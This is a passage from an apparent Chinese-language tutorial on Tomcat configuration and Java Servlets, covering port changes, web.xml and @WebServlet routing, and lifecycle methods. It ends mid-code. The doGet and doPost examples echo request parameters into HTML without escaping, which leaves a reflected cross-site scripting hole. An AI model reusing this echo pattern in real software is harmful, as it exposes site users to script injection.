<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">D:\JavaCode\Tomcat\apache-tomcat-9.0.105\conf\server.xml
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 修改 Shutdown 端口（默认 8005） --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;Server</span> <span class="na">port=</span><span class="s">&#34;8006&#34;</span> <span class="na">shutdown=</span><span class="s">&#34;SHUTDOWN&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">&lt;!-- 修改 HTTP 端口（默认 8080） --&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;Connector</span> <span class="na">port=</span><span class="s">&#34;8081&#34;</span> <span class="na">protocol=</span><span class="s">&#34;HTTP/1.1&#34;</span> <span class="na">connectionTimeout=</span><span class="s">&#34;20000&#34;</span> <span class="na">redirectPort=</span><span class="s">&#34;8443&#34;</span> <span class="nt">/&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><h2 id="javaee-http-servlet路由周期">JavaEE-HTTP-Servlet&amp;路由&amp;周期<a hidden class="anchor" aria-hidden="true" href="#javaee-http-servlet路由周期">#</a></h2>
<h3 id="servlet">Servlet<a hidden class="anchor" aria-hidden="true" href="#servlet">#</a></h3>
<p>参考：<a href="https://blog.csdn.net/qq_52173163/article/details/121110753">https://blog.csdn.net/qq_52173163/article/details/121110753</a></p>
<h4 id="1解释"><strong>1、解释</strong><a hidden class="anchor" aria-hidden="true" href="#1解释">#</a></h4>
<p>Servlet是运行在Web服务器或应用服务器上的程序,它是作为来自Web浏览器或其他HTTP客户端的请求和HTTP服务器上的数据库或应用程序之间的中间层。使用Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。</p>
<h4 id="2创建和使用servlet"><strong>2、创建和使用Servlet</strong><a hidden class="anchor" aria-hidden="true" href="#2创建和使用servlet">#</a></h4>
<p>1.创建一个类继承HttpServlet</p>
<div class="code-block-container" id="code-1769750397250591400" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397250591400">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397250591400" title="Toggle" aria-expanded="false" aria-controls="code-1769750397250591400" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397250591400-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.demo01</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServlet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">IndexServlet</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">HttpServlet</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;--------doGET&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//super.doGet(req, resp);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>2.web.xml配置Servlet路由</p>
<div class="code-block-container" id="code-1769750397252829700" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397252829700">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">xml</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397252829700" title="Toggle" aria-expanded="false" aria-controls="code-1769750397252829700" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397252829700-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;web-app</span> <span class="na">xmlns=</span><span class="s">&#34;http://xmlns.jcp.org/xml/ns/javaee&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xmlns:xsi=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">version=</span><span class="s">&#34;4.0&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 定义Servlet --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;servlet-name&gt;</span>index<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- 指定Servlet类的完整路径 --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;servlet-class&gt;</span>com.example.demo1.IndexServlet<span class="nt">&lt;/servlet-class&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/servlet&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c">&lt;!-- 配置Servlet映射 --&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet-mapping&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;servlet-name&gt;</span>index<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c">&lt;!-- 指定Servlet的URL映射 --&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;url-pattern&gt;</span>/index<span class="nt">&lt;/url-pattern&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/servlet-mapping&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/web-app&gt;</span></span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>3.WebServlet配置Servlet路由</p>
<p>4.写入内置方法(init service destroy doget dopost)</p>
<div class="code-block-container" id="code-1769750397253507800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397253507800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">java</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397253507800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397253507800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397253507800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks"> 1</span>
</span><span class="lnt" id="2"><span class="lnlinks"> 2</span>
</span><span class="lnt" id="3"><span class="lnlinks"> 3</span>
</span><span class="lnt" id="4"><span class="lnlinks"> 4</span>
</span><span class="lnt" id="5"><span class="lnlinks"> 5</span>
</span><span class="lnt" id="6"><span class="lnlinks"> 6</span>
</span><span class="lnt" id="7"><span class="lnlinks"> 7</span>
</span><span class="lnt" id="8"><span class="lnlinks"> 8</span>
</span><span class="lnt" id="9"><span class="lnlinks"> 9</span>
</span><span class="lnt" id="10"><span class="lnlinks">10</span>
</span><span class="lnt" id="11"><span class="lnlinks">11</span>
</span><span class="lnt" id="12"><span class="lnlinks">12</span>
</span><span class="lnt" id="13"><span class="lnlinks">13</span>
</span><span class="lnt" id="14"><span class="lnlinks">14</span>
</span><span class="lnt" id="15"><span class="lnlinks">15</span>
</span><span class="lnt" id="16"><span class="lnlinks">16</span>
</span><span class="lnt" id="17"><span class="lnlinks">17</span>
</span><span class="lnt" id="18"><span class="lnlinks">18</span>
</span><span class="lnt" id="19"><span class="lnlinks">19</span>
</span><span class="lnt" id="20"><span class="lnlinks">20</span>
</span><span class="lnt" id="21"><span class="lnlinks">21</span>
</span><span class="lnt" id="22"><span class="lnlinks">22</span>
</span><span class="lnt" id="23"><span class="lnlinks">23</span>
</span><span class="lnt" id="24"><span class="lnlinks">24</span>
</span><span class="lnt" id="25"><span class="lnlinks">25</span>
</span><span class="lnt" id="26"><span class="lnlinks">26</span>
</span><span class="lnt" id="27"><span class="lnlinks">27</span>
</span><span class="lnt" id="28"><span class="lnlinks">28</span>
</span><span class="lnt" id="29"><span class="lnlinks">29</span>
</span><span class="lnt" id="30"><span class="lnlinks">30</span>
</span><span class="lnt" id="31"><span class="lnlinks">31</span>
</span><span class="lnt" id="32"><span class="lnlinks">32</span>
</span><span class="lnt" id="33"><span class="lnlinks">33</span>
</span><span class="lnt" id="34"><span class="lnlinks">34</span>
</span><span class="lnt" id="35"><span class="lnlinks">35</span>
</span><span class="lnt" id="36"><span class="lnlinks">36</span>
</span><span class="lnt" id="37"><span class="lnlinks">37</span>
</span><span class="lnt" id="38"><span class="lnlinks">38</span>
</span><span class="lnt" id="39"><span class="lnlinks">39</span>
</span><span class="lnt" id="40"><span class="lnlinks">40</span>
</span><span class="lnt" id="41"><span class="lnlinks">41</span>
</span><span class="lnt" id="42"><span class="lnlinks">42</span>
</span><span class="lnt" id="43"><span class="lnlinks">43</span>
</span><span class="lnt" id="44"><span class="lnlinks">44</span>
</span><span class="lnt" id="45"><span class="lnlinks">45</span>
</span><span class="lnt" id="46"><span class="lnlinks">46</span>
</span><span class="lnt" id="47"><span class="lnlinks">47</span>
</span><span class="lnt" id="48"><span class="lnlinks">48</span>
</span><span class="lnt" id="49"><span class="lnlinks">49</span>
</span><span class="lnt" id="50"><span class="lnlinks">50</span>
</span><span class="lnt" id="51"><span class="lnlinks">51</span>
</span><span class="lnt" id="52"><span class="lnlinks">52</span>
</span><span class="lnt" id="53"><span class="lnlinks">53</span>
</span><span class="lnt" id="54"><span class="lnlinks">54</span>
</span><span class="lnt" id="55"><span class="lnlinks">55</span>
</span><span class="lnt" id="56"><span class="lnlinks">56</span>
</span><span class="lnt" id="57"><span class="lnlinks">57</span>
</span><span class="lnt" id="58"><span class="lnlinks">58</span>
</span><span class="lnt" id="59"><span class="lnlinks">59</span>
</span><span class="lnt" id="60"><span class="lnlinks">60</span>
</span><span class="lnt" id="61"><span class="lnlinks">61</span>
</span><span class="lnt" id="62"><span class="lnlinks">62</span>
</span><span class="lnt" id="63"><span class="lnlinks">63</span>
</span><span class="lnt" id="64"><span class="lnlinks">64</span>
</span><span class="lnt" id="65"><span class="lnlinks">65</span>
</span><span class="lnt" id="66"><span class="lnlinks">66</span>
</span><span class="lnt" id="67"><span class="lnlinks">67</span>
</span><span class="lnt" id="68"><span class="lnlinks">68</span>
</span><span class="lnt" id="69"><span class="lnlinks">69</span>
</span><span class="lnt" id="70"><span class="lnlinks">70</span>
</span><span class="lnt" id="71"><span class="lnlinks">71</span>
</span><span class="lnt" id="72"><span class="lnlinks">72</span>
</span><span class="lnt" id="73"><span class="lnlinks">73</span>
</span><span class="lnt" id="74"><span class="lnlinks">74</span>
</span><span class="lnt" id="75"><span class="lnlinks">75</span>
</span><span class="lnt" id="76"><span class="lnlinks">76</span>
</span><span class="lnt" id="77"><span class="lnlinks">77</span>
</span><span class="lnt" id="78"><span class="lnlinks">78</span>
</span><span class="lnt" id="79"><span class="lnlinks">79</span>
</span><span class="lnt" id="80"><span class="lnlinks">80</span>
</span><span class="lnt" id="81"><span class="lnlinks">81</span>
</span><span class="lnt" id="82"><span class="lnlinks">82</span>
</span><span class="lnt" id="83"><span class="lnlinks">83</span>
</span><span class="lnt" id="84"><span class="lnlinks">84</span>
</span><span class="lnt" id="85"><span class="lnlinks">85</span>
</span><span class="lnt" id="86"><span class="lnlinks">86</span>
</span><span class="lnt" id="87"><span class="lnlinks">87</span>
</span><span class="lnt" id="88"><span class="lnlinks">88</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.demo1</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.PrintWriter</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletConfig</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletResponse</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.annotation.WebServlet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServlet</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletRequest</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.http.HttpServletResponse</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="c1">// 使用@WebServlet注解将Servlet映射到特定的URL</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="nd">@WebServlet</span><span class="p">(</span><span class="s">&#34;/a&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">IndexServlet</span><span class="w"> </span><span class="kd">extends</span><span class="w"> </span><span class="n">HttpServlet</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 处理GET请求的方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doGet</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;--------------doGet&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 从请求中获取参数&#34;id&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;id&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 设置响应的内容类型</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">resp</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/html; charset=GBK&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 获取PrintWriter以将HTML响应发送给客户端</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resp</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 输出从GET请求中收到的数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;这是GET请求的数据:&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;id：&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;&lt;br&gt;&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 处理POST请求的方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doPost</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">req</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">resp</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 从请求中获取参数&#34;name&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">req</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 设置响应的内容类型</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">resp</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/html; charset=GBK&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 获取PrintWriter以将HTML响应发送给客户端</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">resp</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 输出从POST请求中收到的数据</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;这是post提交的数据&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;--------------doPost&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 当Servlet首次创建时调用的初始化方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">ServletConfig</span><span class="w"> </span><span class="n">config</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;--------------init&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 可以在这里添加任何初始化任务的代码</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// 当Servlet被销毁时调用的方法</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
